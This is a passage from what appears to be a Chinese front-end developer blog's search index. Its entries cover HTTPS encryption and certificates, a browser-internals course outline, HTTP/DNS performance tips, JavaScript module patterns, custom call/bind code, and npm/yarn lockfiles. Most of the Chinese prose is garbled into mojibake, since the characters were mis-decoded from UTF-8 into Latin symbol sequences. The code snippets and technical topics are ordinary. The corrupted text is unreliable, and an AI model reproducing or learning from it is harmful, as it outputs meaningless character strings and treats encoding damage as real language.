secretï¼ŒåŒæ–¹å°±å¯ä»¥è¿›è¡Œæ•°æ®åŠ å¯†ä¼ è¾“äº†ï¼› å¯¹ç§°åŠ å¯†ç¼ºç‚¹ï¼šclient-random å’Œ service-random çš„è¿‡ç¨‹éƒ½æ˜¯æ˜Žæ–‡ï¼Œé»‘å®¢å¯ä»¥æ‹¿åˆ°åå•†çš„åŠ å¯†å¥—ä»¶å’ŒåŒæ–¹éšæœºæ•°ï¼Œç”Ÿæˆå¯†é’¥ï¼Œæ•°æ®å¯ä»¥è¢«ç ´è§£ï¼› éžå¯¹ç§°åŠ å¯†ï¼šæµè§ˆå™¨å‘é€åŠ å¯†å¥—ä»¶åˆ—è¡¨ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨é€‰æ‹©ä¸€ä¸ªåŠ å¯†å¥—ä»¶ï¼Œè¿”å›žåŠ å¯†å¥—ä»¶å’Œå…¬é’¥ï¼Œæµè§ˆå™¨ç”¨å…¬é’¥åŠ å¯†æ•°æ®ï¼ŒæœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†ï¼› éžå¯¹ç§°åŠ å¯†ç¼ºç‚¹ï¼šåŠ å¯†æ•ˆçŽ‡å¤ªä½Žï¼Œä¸èƒ½ä¿è¯æœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„æ•°æ®å®‰å…¨ï¼Œé»‘å®¢å¯ä»¥èŽ·å–å…¬é’¥ï¼› å¯¹ç§°åŠ å¯†ç»“åˆéžå¯¹ç§°åŠ å¯†ï¼šæµè§ˆå™¨å‘é€å¯¹ç§°åŠ å¯†å¥—ä»¶åˆ—è¡¨ã€éžå¯¹ç§°åŠ å¯†åˆ—è¡¨å’Œéšæœºæ•° client-random ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç”Ÿæˆéšæœºæ•° service-randomï¼Œé€‰æ‹©åŠ å¯†å¥—ä»¶å’Œå…¬é’¥è¿”å›žç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨åˆ©ç”¨ client-random å’Œ service-random è®¡ç®—å‡º pre-masterï¼Œç„¶åŽåˆ©ç”¨å…¬é’¥ç»™ pre-master åŠ å¯†ï¼Œå‘æœåŠ¡å™¨å‘é€åŠ å¯†åŽçš„æ•°æ®ï¼ŒæœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†å‡º pre-master æ•°æ®ï¼Œç»“åˆ client-random å’Œ service-random ç”Ÿæˆå¯¹ç§°å¯†é’¥ï¼Œä½¿ç”¨å¯¹ç§°å¯†é’¥ä¼ è¾“åŠ å¯†æ•°æ®ï¼› å¼•å…¥æ•°å­—è¯ä¹¦æ˜¯ä¸ºäº†è¯æ˜Žâ€œæˆ‘å°±æ˜¯æˆ‘â€ï¼Œé˜²æ­¢ DNS è¢«åŠ«æŒï¼Œä¼ªé€ æœåŠ¡å™¨ï¼› è¯ä¹¦çš„ä½œç”¨ï¼šä¸€ä¸ªæ˜¯å‘æµè§ˆå™¨è¯æ˜ŽæœåŠ¡å™¨çš„èº«ä»½ï¼Œå¦ä¸€ä¸ªæ˜¯åŒ…å«æœåŠ¡å™¨å…¬é’¥ï¼› æ•°å­—ç­¾åè¿‡ç¨‹ï¼šCA ä½¿ç”¨ Hash å‡½æ•°æŠ€æœ¯æ˜Žæ–‡ä¿¡æ¯ï¼Œå¾—å‡ºä¿¡æ¯æ‘˜è¦ï¼Œç„¶åŽ CA ä½¿ç”¨ç§é’¥å¯¹ä¿¡æ¯æ‘˜è¦è¿›è¡ŒåŠ å¯†ï¼ŒåŠ å¯†åŽçš„ç§˜æ–‡å°±æ˜¯æ•°å­—ç­¾åï¼› éªŒè¯æ•°å­—ç­¾åï¼šè¯»å–è¯ä¹¦æ˜Žæ–‡ä¿¡æ¯ï¼Œä½¿ç”¨ç›¸åŒ Hash å‡½æ•°è®¡ç®—å¾—åˆ°ä¿¡æ¯æ‘˜è¦ Aï¼Œå†åˆ©ç”¨ CA çš„å…¬é’¥è§£å¯†å¾—åˆ° Bï¼Œå¯¹æ¯” A å’Œ Bï¼Œå¦‚æžœä¸€è‡´ï¼Œåˆ™ç¡®è®¤è¯ä¹¦åˆæ³•ï¼› åŽŸæ–‡æ•´ç†æœ€åŽï¼Œåœ¨ç½‘ä¸Šæœ‰äº›å¤§ç¥žæœ‰æ•´ç†å‡ºäº†å„ä¸ªç« èŠ‚åœ¨çº¿åŽŸæ–‡ï¼Œç¡®å®žæ˜¯èŠ±äº†ä¸å°‘å¿ƒæ€ï¼Œåœ¨è¿™é‡Œä¹Ÿæ•´ç†åˆ° git ä¸Šäº†ï¼Œæœ‰å…´è¶£çš„ç«¥éž‹å¯ä»¥è‡ªè¡ŒæŸ¥é˜…ï¼Œå®Œï½ž å®è§‚è§†è§’ä¸Šçš„æµè§ˆå™¨ Chrome æž¶æž„ï¼šä»…ä»…æ‰“å¼€ 1 ä¸ªé¡µé¢ï¼Œä¸ºä»€ä¹ˆæœ‰ 4 ä¸ªè¿›ç¨‹ TCP åè®®ï¼šå¦‚ä½•ä¿è¯é¡µé¢æ–‡ä»¶èƒ½è¢«å®Œæ•´é€è¾¾æµè§ˆå™¨ HTTP è¯·æ±‚æµç¨‹ï¼šä¸ºä»€ä¹ˆå¾ˆå¤šç«™ç‚¹ç¬¬äºŒæ¬¡æ‰“å¼€é€Ÿåº¦ä¼šå¾ˆå¿« å¯¼èˆªæµç¨‹ï¼šä»Žè¾“å…¥ URL åˆ°é¡µé¢å±•ç¤ºè¿™ä¸­é—´å‘ç”Ÿäº†ä»€ä¹ˆ æ¸²æŸ“æµç¨‹ï¼ˆä¸Šï¼‰ï¼šHTMLã€CSS å’Œ JavaScript æ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ æ¸²æŸ“æµç¨‹ï¼ˆä¸‹ï¼‰ï¼šHTMLã€CSS å’Œ JavaScript æ˜¯å¦‚ä½•å˜æˆé¡µé¢çš„ æµè§ˆå™¨ä¸­çš„ JavaScript æ‰§è¡Œæœºåˆ¶ å˜é‡æå‡ï¼šJavaScript ä»£ç æ˜¯æŒ‰é¡ºåºæ‰§è¡Œçš„å— è°ƒç”¨æ ˆï¼šä¸ºä»€ä¹ˆ JavaScript ä»£ç ä¼šå‡ºçŽ°æ ˆæº¢å‡º å—çº§ä½œç”¨åŸŸï¼švar ç¼ºé™·ä»¥åŠä¸ºä»€ä¹ˆè¦å¼•å…¥ let å’Œ const ä½œç”¨åŸŸé“¾å’Œé—­åŒ…ï¼šä»£ç ä¸­å‡ºçŽ°ç›¸åŒçš„å˜é‡ï¼ŒJavaScript å¼•æ“Žå¦‚ä½•é€‰æ‹© thisï¼šä»Ž JavaScript æ‰§è¡Œä¸Šä¸‹æ–‡è§†è§’è®² this V8 å·¥ä½œåŽŸç† æ ˆç©ºé—´å’Œå †ç©ºé—´ï¼šæ•°æ®æ˜¯å¦‚ä½•å­˜å‚¨çš„ åžƒåœ¾å›žæ”¶ï¼šåžƒåœ¾æ•°æ®å¦‚ä½•è‡ªåŠ¨å›žæ”¶ ç¼–è¯‘å™¨å’Œè§£æžå™¨ï¼šV8 å¦‚ä½•æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç çš„ æµè§ˆå™¨ä¸­çš„é¡µé¢å¾ªçŽ¯ç³»ç»Ÿ æ¶ˆæ¯é˜Ÿåˆ—å’Œäº‹ä»¶å¾ªçŽ¯ï¼šé¡µé¢æ˜¯æ€Žä¹ˆæ´»èµ·æ¥çš„ Webapiï¼šsetTimeout æ˜¯æ€Žä¹ˆå®žçŽ°çš„ Webapiï¼šXMLHttpRequest æ˜¯æ€Žä¹ˆå®žçŽ°çš„ å®ä»»åŠ¡å’Œå¾®ä»»åŠ¡ï¼šä¸æ˜¯æ‰€æœ‰çš„ä»»åŠ¡éƒ½æ˜¯ä¸€ä¸ªå¾…é‡ ä½¿ç”¨ Promise å‘Šåˆ«å›žè°ƒå‡½æ•° async-await ä½¿ç”¨åŒæ­¥æ–¹å¼å†™å¼‚æ­¥ä»£ç  æµè§ˆå™¨ä¸­çš„é¡µé¢ é¡µé¢æ€§èƒ½åˆ†æžï¼šåˆ©ç”¨ chrome åš web æ€§èƒ½åˆ†æž DOM æ ‘ï¼šJavaScript æ˜¯å¦‚ä½•å½±å“ DOM æ ‘æž„å»ºçš„ æ¸²æŸ“æµæ°´çº¿ï¼šCSS å¦‚ä½•å½±å“é¦–æ¬¡åŠ è½½æ—¶çš„ç™½å±æ—¶é—´ åˆ†å±‚å’Œåˆæˆæœºåˆ¶ï¼šä¸ºä»€ä¹ˆ CSS åŠ¨ç”»æ¯” JavaScript é«˜æ•ˆ é¡µé¢æ€§èƒ½ï¼šå¦‚ä½•ç³»ç»Ÿä¼˜åŒ–é¡µé¢ è™šæ‹Ÿ DOMï¼šè™šæ‹Ÿ DOM å’Œå®žé™… DOM æœ‰ä½•ä¸åŒ PWAï¼šè§£å†³äº† web åº”ç”¨å“ªäº›é—®é¢˜ webComponentï¼šåƒæ­ç§¯æœ¨ä¸€æ ·æž„å»º web åº”ç”¨ æµè§ˆå™¨ä¸­çš„ç½‘ç»œ HTTP1ï¼šHTTP æ€§èƒ½ä¼˜åŒ– HTTP2ï¼šå¦‚ä½•æå‡ç½‘ç»œé€Ÿåº¦ HTTP3ï¼šç”©æŽ‰ TCPã€TCL åŒ…è¢±ï¼Œæž„å»ºé«˜æ•ˆç½‘ç»œ åŒæºç­–ç•¥ï¼šä¸ºä»€ä¹ˆ XMLHttpRequest ä¸èƒ½è·¨åŸŸè¯·æ±‚èµ„æº è·¨ç«™è„šæœ¬æ”»å‡» XSSï¼šä¸ºä»€ä¹ˆ cookie ä¸­æœ‰ httpOnly å±žæ€§ CSRF æ”»å‡»ï¼šé™Œç”Ÿé“¾æŽ¥ä¸è¦éšä¾¿ç‚¹ æ²™ç›’ï¼šé¡µé¢å’Œç³»ç»Ÿä¹‹é—´çš„éš”ç¦»å¢™ HTTPSï¼šè®©æ•°æ®ä¼ è¾“æ›´å®‰å…¨ æµè§ˆå™¨å·¥ä½œåŽŸç†ä¸Žå®žè·µ]]></content>
      <tags>
        <tag>æµè§ˆå™¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŸºäºŽhttpå‰ç«¯æ€§èƒ½ä¼˜åŒ–]]></title>
    <url>%2F2021%2F04%2F05%2Ffe-optimization-http%2F</url>
    <content type="text"><![CDATA[å‰è¨€å‰ç«¯æ€§èƒ½çš„ä¼˜åŒ–çš„å‰ææ˜¯è¦äº†è§£å¯¹é¡µé¢åŠ è½½å…¨æµç¨‹ï¼Œæ­£å¦‚è€ç”Ÿå¸¸è°ˆçš„ â€œæµè§ˆå™¨ä»Žè¾“å…¥ URL åˆ°é¡µé¢åŠ è½½å‡ºæ¥å‘ç”Ÿäº†ä»€ä¹ˆâ€ï¼Œä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š DNS è§£æž:å°†åŸŸåè§£æžæˆ IP åœ°å€ TCP è¿žæŽ¥ï¼šTCP ä¸‰æ¬¡æ¡æ‰‹ å‘é€ HTTP è¯·æ±‚ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›ž HTTP æŠ¥æ–‡ æµè§ˆå™¨è§£æžæ¸²æŸ“é¡µé¢ æ–­å¼€è¿žæŽ¥ï¼šTCP å››æ¬¡æŒ¥æ‰‹ æ€»ç»“æ¥çœ‹ï¼Œå¯ä¼˜åŒ–ç‚¹æœ‰ï¼š åŸŸåè§£æžï¼ˆDNSï¼‰ ä½¿ç”¨ HTTP2 å‡å°‘ http è¯·æ±‚æ¬¡æ•° å‡å°è¯·æ±‚å¤§å° æµè§ˆå™¨ç¼“å­˜ é’ˆå¯¹æ¯ä¸ªæµç¨‹è¿›è¡Œåº”å¯¹ä¼˜åŒ–æ–¹æ¡ˆã€‚ åŸŸåè§£æžï¼ˆDNSï¼‰DNS åè®®æä¾›é€šè¿‡åŸŸåæŸ¥æ‰¾ IP åœ°å€ï¼Œæˆ–é€†å‘ä»Ž IP åœ°å€åæŸ¥åŸŸåçš„æœåŠ¡ã€‚DNS æ˜¯ä¸€ä¸ªç½‘ç»œæœåŠ¡å™¨ï¼Œæˆ‘ä»¬çš„åŸŸåè§£æžç®€å•æ¥è¯´å°±æ˜¯åœ¨ DNS ä¸Šè®°å½•ä¸€æ¡ä¿¡æ¯è®°å½•ã€‚ DNS æŸ¥æ‰¾æµç¨‹æµè§ˆå™¨ç¼“å­˜ï¼šæµè§ˆå™¨ä¼šæŒ‰ç…§ä¸€å®šçš„é¢‘çŽ‡ç¼“å­˜ DNS è®°å½•ã€‚æ“ä½œç³»ç»Ÿç¼“å­˜ï¼šå¦‚æžœæµè§ˆå™¨ç¼“å­˜ä¸­æ‰¾ä¸åˆ°éœ€è¦çš„ DNS è®°å½•ï¼Œé‚£å°±åŽ»æ“ä½œç³»ç»Ÿä¸­æ‰¾ã€‚è·¯ç”±ç¼“å­˜ï¼šè·¯ç”±å™¨ä¹Ÿæœ‰ DNS ç¼“å­˜ã€‚ISP çš„ DNS æœåŠ¡å™¨ï¼šISP æ˜¯äº’è”ç½‘æœåŠ¡æä¾›å•†(Internet Service Provider)çš„ç®€ç§°ï¼ŒISP æœ‰ä¸“é—¨çš„ DNS æœåŠ¡å™¨åº”å¯¹ DNS æŸ¥è¯¢è¯·æ±‚ã€‚æ ¹æœåŠ¡å™¨ï¼šISP çš„ DNS æœåŠ¡å™¨è¿˜æ‰¾ä¸åˆ°çš„è¯ï¼Œå®ƒå°±ä¼šå‘æ ¹æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè¿›è¡Œé€’å½’æŸ¥è¯¢ï¼ˆDNS æœåŠ¡å™¨å…ˆé—®æ ¹åŸŸåæœåŠ¡å™¨.com åŸŸåæœåŠ¡å™¨çš„ IP åœ°å€ï¼Œç„¶åŽå†é—®.baidu åŸŸåæœåŠ¡å™¨ï¼Œä¾æ¬¡ç±»æŽ¨ï¼‰]]></content>
      <tags>
        <tag>ä¼˜åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js-design-pattern]]></title>
    <url>%2F2021%2F03%2F27%2Fjs-design-pattern%2F</url>
    <content type="text"><![CDATA[å•ä¾‹ï¼ˆSingletonï¼‰æ¨¡å¼åŸºäºŽå•ç‹¬çš„å®žä¾‹ï¼Œæ¥ç®¡ç†æŸä¸€ä¸ªæ¨¡å—ä¸­çš„å†…å®¹ï¼Œå®žçŽ°æ¨¡å—ä¹‹é—´çš„ç‹¬ç«‹åˆ’åˆ†ï¼Œä½†æ˜¯ï¼Œä¹Ÿå¯ä»¥å®žçŽ°æ¨¡å—ä¹‹é—´æ–¹æ³•çš„ç›¸äº’è°ƒç”¨ã€‚ æ—©æœŸçš„æ¨¡å—åŒ–ç¼–ç¨‹AMD -&gt; require.jsCMD/CommonJS -&gt; sea.js &amp; NodeES6 Module 1234567891011121314151617181920212223242526// ç¨‹åºå‘˜Aå¼€å‘çš„æ¨¡å—var AModule = (function () &#123; var data = [] function bindHTML() &#123; //... &#125; function change() &#123; //... &#125; return &#123; bindHTML: bindHTML &#125;&#125;)()// ç¨‹åºå‘˜Bå¼€å‘çš„æ¨¡å—var BModule = (function () &#123; var data = [] function bindHTML() &#123; //... &#125; return &#123; bindHTML: bindHTML &#125;&#125;)() 12345678910111213var serchModule = function () &#123; var body = document.body function queryData() &#123;&#125; function bindHtml() &#123;&#125; function handle() &#123;&#125; return &#123; init: function () &#123; queryData() bindHtml() handle() &#125; &#125;&#125; ä»£ç†æ¨¡å¼è£…é¥°æ¨¡å¼è§‚å¯Ÿè€…æ¨¡å¼å‘å¸ƒ-è®¢é˜…è€…æ¨¡å¼ç­–ç•¥æ¨¡å¼]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ‰‹æ’•æºç ]]></title>
    <url>%2F2021%2F03%2F25%2Fshred-source-code%2F</url>
    <content type="text"><![CDATA[å®žçŽ° call()ã€applyã€bind()1234567891011121314151617181920212223// callFunction.prototype.call = function call(context, ...args) &#123; const self = this const key = Symbol('key') // null undefined context == null ? (context = window) : null // string number !/^(object|function)$/i.test(typeof context) ? (context = Object(context)) : null // array function object context[key] = self const result = context[key](...args) delete context[key] return result&#125;// bindFunction.prototype.bind = function (context, ...args) &#123; const _this = this return function proxy(...params) &#123; return _this.apply(context, args.concat(params)) &#125;&#125;]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>é¢è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm/yarn lockçœŸé¦™]]></title>
    <url>%2F2021%2F03%2F11%2Fnpm-yarn-lock%2F</url>
    <content type="text"><![CDATA[å‰è¨€çœ‹å®Œæœ¬æ–‡ï¼Œä½ å°†ä»Žæ•´ä½“äº†è§£ä¾èµ–ç‰ˆæœ¬é”å®šåŽŸç†ï¼Œpackage-lock.json æˆ– yarn.lock çš„é‡è¦æ€§ã€‚é¦–å…ˆè¦ä»Žæœ€è¿‘æŽ¥è¿žå‡ºçŽ°ä¸¤èµ·æœ‰å…³ npm å®‰è£… package.json ä¸­ä¾èµ–åŒ…ï¼Œç”±äºŽä¾èµ–åŒ…ç‰ˆæœ¬æ›´æ–° bug é€ æˆé¡¹ç›®å‡ºé”™é—®é¢˜è¯´èµ·ã€‚ äº‹ä»¶ä¸€ï¼šæ–°ç‰ˆæœ¬ä¾èµ–åŒ…æœ¬èº« bugé¡¹ç›®æœ¬åœ°æ‰“åŒ…æ­£å¸¸ï¼Œä½†æ˜¯çº¿ä¸Šä½¿ç”¨ Jenkins å®Œæˆ DevOps äº¤ä»˜æµæ°´çº¿æ‰“åŒ…å‡ºé”™é—®é¢˜ã€‚æŠ¥å‡ºå¦‚ä¸‹é”™è¯¯ï¼š 123**17:15:32** ERROR in ./node_modules/clipboard/dist/clipboard.js**17:15:32** Module build failed (from ./node_modules/babel-loader/lib/index.js):**17:15:32** Error: Couldn't find preset "@babel/env" relative to directory "/app/workspace/SIT/node_modules/clipboard" æ˜¾ç¤ºé”™è¯¯åŽŸå› æ˜¯ clipboard æ’ä»¶æ²¡æœ‰å®‰è£… @babel/env é¢„è®¾ï¼ˆpresetï¼‰ã€‚æ˜Žæ˜¾è¿™ä¸ªæ˜¯æ’ä»¶é—®é¢˜äº†ï¼ŒåŽ»å®˜æ–¹åº“ clipboard æŸ¥çœ‹æºç å‘çŽ°è¯¥åº“ä¾èµ–åŒ…å¾ˆå°‘ï¼Œå¤§éƒ¨åˆ†æ˜¯åŽŸç”Ÿå®žçŽ°ã€‚å†çœ‹ issue åˆ«äººæœ‰æ²¡æœ‰å‡ºçŽ°åŒæ ·çš„é—®é¢˜ï¼Œç›®å‰æ¥çœ‹è¿˜æ²¡æœ‰äººæå‡ºã€‚ä»¥æ­¤æŽ¨æ–­å¯èƒ½æ˜¯æ’ä»¶æœ¬èº«çš„ â€œé—®é¢˜â€ äº†ã€‚ ä½†æ˜¯æˆ‘æœ¬åœ°é¡¹ç›®æ‰“åŒ…æ­£å¸¸ï¼Œçº¿ä¸Šçš„å‡ºé”™ï¼Œå¯èƒ½ç”±äºŽæœ¬åœ°ç‰ˆæœ¬å’Œçº¿ä¸Šç‰ˆæœ¬ä¸ä¸€è‡´å¯¼è‡´ï¼ˆæŸä¸ªå°ç‰ˆæœ¬å‡ºçŽ°çš„ bugï¼‰çš„ã€‚é€šè¿‡æŸ¥çœ‹package.json é…ç½®çš„ clipboard: &quot;^2.0.4&quot;ï¼Œçº¿ä¸Šå®žé™…å®‰è£…ç‰ˆæœ¬æ˜¯ 2.0.7ï¼Œè€Œæˆ‘æœ¬åœ°å®žé™…å®‰è£…ç‰ˆæœ¬æ˜¯ 2.0.6å› æ­¤å®šä½åˆ° 2.0.7 å‡ºçŽ°çš„ â€œé—®é¢˜â€ã€‚ ç”±äºŽæ˜¯æ’ä»¶æœ¬èº«â€œé—®é¢˜â€ï¼Œæˆ‘çš„ä¸´æ—¶è§£å†³åŠžæ³•æ˜¯é”å®šåˆ° 2.0.4 ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯ clipboard: &quot;2.0.4&quot;ï¼ŒåŽé¢åŠ ä¸Š package-lock.jsonã€‚ æ‰“ç ´æ²™é”…é—®åˆ°åº•æ—¢ç„¶â€œé—®é¢˜â€å·²ç»å®šä½åˆ°äº† 2.0.7 ç‰ˆæœ¬ï¼Œè¿›ä¸€æ­¥é€šè¿‡å¯¹æ¯”æ­¤æ¬¡ç‰ˆæœ¬æäº¤æ–‡ä»¶å†…å®¹å·®å¼‚ï¼Œå‘çŽ° .babelrc æ–‡ä»¶ç”¨åˆ°çš„ preset æ˜¯ envã€‚ 2.0.7 ç‰ˆæœ¬ç”¨çš„æ˜¯ @bable/envï¼Œå°† babel æ›´æ–°åˆ°äº† 7ï¼å…·ä½“åŽŸå› ç‚¹è¿™é‡Œ é—®é¢˜åŸºæœ¬å®šä½åˆ°äº†ï¼Œè¿™é‡Œå°±é¡ºä¾¿ç»™ä½œè€…æäº†ä¸€ä¸ª issuesã€‚ äº‹ä»¶äºŒï¼šä¾èµ–åŒ…çš„æ–°ç‰ˆæ’ä»¶ bugä¸€ç›´æ­£å¸¸ä½¿ç”¨çš„ braft-editor ä¼˜ç§€çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨æ’ä»¶ï¼Œæœ€è¿‘åœ¨å…¶ä»–å°ä¼™ä¼´ç”µè„‘æˆ–è€…åœ¨æˆ‘æœ¬åœ°ç”µè„‘é‡æ–°éƒ¨ç½²é¡¹ç›®ï¼Œå¯åŠ¨åŽå‘çŽ° toHtml() æ–¹æ³•èŽ·å–å¯Œæ–‡æœ¬ html å†…å®¹æ€»æ˜¯ç©ºï¼ åŽ†å²ç‰ˆæœ¬æ˜¯æ­£å¸¸çš„ï¼ŒçŒœæµ‹å¯èƒ½åˆæ˜¯ç‰ˆæœ¬æ›´æ–°é€ æˆã€‚åŒæ ·çš„ï¼ŒåŽ»å®˜æ–¹åº“ braft-editorçœ‹çœ‹ issues åˆ«äººæœ‰æ²¡æœ‰é‡åˆ°åŒæ ·çš„é—®é¢˜ã€‚æžœç„¶è¿™æ¬¡æœ‰ï¼ŒåŽŸå› æ˜¯å®ƒçš„ä¾èµ–åŒ… draft-js æ›´æ–°åŽçš„é—®é¢˜ï¼Œå…·ä½“çš„çœ‹è¿™ä¸ª issuesã€‚ è¿™ä¸ªæ˜¯ç”±äºŽæ’ä»¶çš„ä¾èµ–åŒ…æ›´æ–°å‡ºçŽ°çš„é—®é¢˜ï¼Œç›´æŽ¥åŽ»é”å®šå½“å‰æ’ä»¶æ²¡æœ‰ä½œç”¨ï¼Œä¸ä¼šå¯¹å®ƒçš„ä¾èµ–åŒ…äº§ç”Ÿçº¦æŸï¼ˆä¾èµ–åŒ…è¿˜æ˜¯ä¼šåŽ»ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„åŒ…ï¼‰ã€‚æˆ‘çš„ä¸´æ—¶è§£å†³åŠžæ³•æ˜¯å°è¯•å°†ç‰ˆæœ¬å›žé€€åˆ°åŽä¸€ä¸ªç‰ˆæœ¬å¹¶é”å®šã€‚è¿™æ ·åšçš„åŽŸå› æ˜¯å›žé€€ç‰ˆæœ¬çš„ä¾èµ–åŒ…ç‰ˆæœ¬è‚¯å®šä¼šä½ŽäºŽçŽ°åœ¨çš„ï¼Œä¹‹å‰çš„ç‰ˆæœ¬æ˜¯æ­£å¸¸çš„ã€‚ ç»éªŒæ•™è®­å…¶å®žè¿™ä¸¤èµ·äº‹ä»¶æ˜¯åŒä¸€ä¸ªè¯±å› å¯¼è‡´çš„ï¼šæ²¡æœ‰é”å®šå½“å‰é¡¹ç›®ä¾èµ–æ ‘æ¨¡å—çš„ç‰ˆæœ¬ã€‚ä¸‹é¢å°±æ¥æŽ¢ç©¶ä¸€ä¸‹ä¾èµ–åŒ…çš„ç‰ˆæœ¬ç®¡ç†ã€‚ è¯­ä¹‰åŒ–ç‰ˆæœ¬ï¼ˆsemverï¼‰package.json åœ¨å‰ç«¯å·¥ç¨‹åŒ–ä¸­ä¸»è¦ç”¨æ¥è®°å½•ä¾èµ–åŒ…åç§°ã€ç‰ˆæœ¬ã€è¿è¡ŒæŒ‡ä»¤ç­‰ä¿¡æ¯å­—æ®µã€‚å…¶ä¸­ï¼Œdependencies å­—æ®µæŒ‡å®šäº†é¡¹ç›®è¿è¡Œæ‰€ä¾èµ–çš„æ¨¡å—ï¼ŒdevDependencies æŒ‡å®šé¡¹ç›®å¼€å‘æ‰€éœ€è¦çš„æ¨¡å—ã€‚å®ƒä»¬éƒ½æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ã€‚è¯¥å¯¹è±¡çš„å„ä¸ªæˆå‘˜ï¼Œåˆ†åˆ«ç”±æ¨¡å—åå’Œå¯¹åº”çš„ç‰ˆæœ¬è¦æ±‚ç»„æˆï¼Œè¡¨ç¤ºä¾èµ–çš„æ¨¡å—åŠå…¶ç‰ˆæœ¬èŒƒå›´ã€‚å¯¹åº”çš„ç‰ˆæœ¬å¯ä»¥åŠ ä¸Šå„ç§é™å®šï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š æŒ‡å®šç‰ˆæœ¬ï¼šæ¯”å¦‚ 1.2.2 ï¼Œéµå¾ªâ€œå¤§ç‰ˆæœ¬.æ¬¡è¦ç‰ˆæœ¬.å°ç‰ˆæœ¬â€çš„æ ¼å¼è§„å®šï¼Œå®‰è£…æ—¶åªå®‰è£…æŒ‡å®šç‰ˆæœ¬ã€‚ æ³¢æµªå·ï¼ˆtildeï¼‰+æŒ‡å®šç‰ˆæœ¬ï¼šæ¯”å¦‚ ~1.2.2 ï¼Œè¡¨ç¤ºå®‰è£… 1.2.x çš„æœ€æ–°ç‰ˆæœ¬ï¼ˆä¸ä½ŽäºŽ1.2.2ï¼‰ï¼Œä½†æ˜¯ä¸å®‰è£… 1.3.xï¼Œä¹Ÿå°±æ˜¯è¯´å®‰è£…æ—¶ä¸æ”¹å˜å¤§ç‰ˆæœ¬å·å’Œæ¬¡è¦ç‰ˆæœ¬å·ã€‚ æ’å…¥å·ï¼ˆcaretï¼‰+æŒ‡å®šç‰ˆæœ¬ï¼šæ¯”å¦‚ Ë†1.2.2ï¼Œè¡¨ç¤ºå®‰è£… 1.x.x çš„æœ€æ–°ç‰ˆæœ¬ï¼ˆä¸ä½ŽäºŽ 1.2.2ï¼‰ï¼Œä½†æ˜¯ä¸å®‰è£… 2.x.xï¼Œä¹Ÿå°±æ˜¯è¯´å®‰è£…æ—¶ä¸æ”¹å˜å¤§ç‰ˆæœ¬å·ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æžœå¤§ç‰ˆæœ¬å·ä¸º 0ï¼Œåˆ™æ’å…¥å·çš„è¡Œä¸ºä¸Žæ³¢æµªå·ç›¸åŒï¼Œè¿™æ˜¯å› ä¸ºæ­¤æ—¶å¤„äºŽå¼€å‘é˜¶æ®µï¼Œå³ä½¿æ˜¯æ¬¡è¦ç‰ˆæœ¬å·å˜åŠ¨ï¼Œä¹Ÿå¯èƒ½å¸¦æ¥ç¨‹åºçš„ä¸å…¼å®¹ã€‚ latestï¼šå®‰è£…æœ€æ–°ç‰ˆæœ¬ã€‚ å½“æˆ‘ä»¬ä½¿ç”¨æ¯”å¦‚ npm install package -save å®‰è£…ä¸€ä¸ªä¾èµ–åŒ…æ—¶ï¼Œç‰ˆæœ¬æ˜¯æ’å…¥å·å½¢å¼ã€‚è¿™æ ·æ¯æ¬¡é‡æ–°å®‰è£…ä¾èµ–åŒ… npm install æ—¶â€æ¬¡è¦ç‰ˆæœ¬â€œå’Œâ€œå°ç‰ˆæœ¬â€æ˜¯ä¼šæ‹‰å–æœ€æ–°çš„ã€‚ä¸€èˆ¬çš„ï¼Œä¸»ç‰ˆæœ¬ä¸å˜çš„æƒ…å†µä¸‹ï¼Œä¸ä¼šå¸¦æ¥æ ¸å¿ƒåŠŸèƒ½å˜åŠ¨ï¼ŒAPI åº”è¯¥å…¼å®¹æ—§ç‰ˆï¼Œä½†æ˜¯è¿™åœ¨å¼€æºçš„ä¸–ç•Œé‡Œå¾ˆéš¾æŽ§åˆ¶ï¼Œå°¤å…¶åœ¨å¤æ‚é¡¹ç›®çš„ä¼—å¤šä¾èµ–åŒ…ä¸­éš¾å…ä¼šå¼•å…¥ä¸€äº›æ„æƒ³ä¸åˆ°çš„ bugã€‚ npm-shrinkwrap &amp;&amp; package-locknpm-shrinkwrapæ­£æ˜¯å­˜åœ¨è¿™æ¯æ¬¡é‡æ–°å®‰è£…ï¼Œä¾èµ–æ ‘æ¨¡å—ç‰ˆæœ¬å­˜åœ¨çš„ä¸ç¡®å®šæ€§ï¼Œæ‰æœ‰äº†ç›¸åº”çš„é”å®šç‰ˆæœ¬æœºåˆ¶ã€‚ npm5 ä¹‹å‰å¯ä»¥é€šè¿‡ npmshrinkwrap å®žçŽ°ã€‚é€šè¿‡è¿è¡Œ npm shrinkwrapï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª npm-shrinkwrap.json æ–‡ä»¶ï¼Œå®ƒæ˜¯ package.json 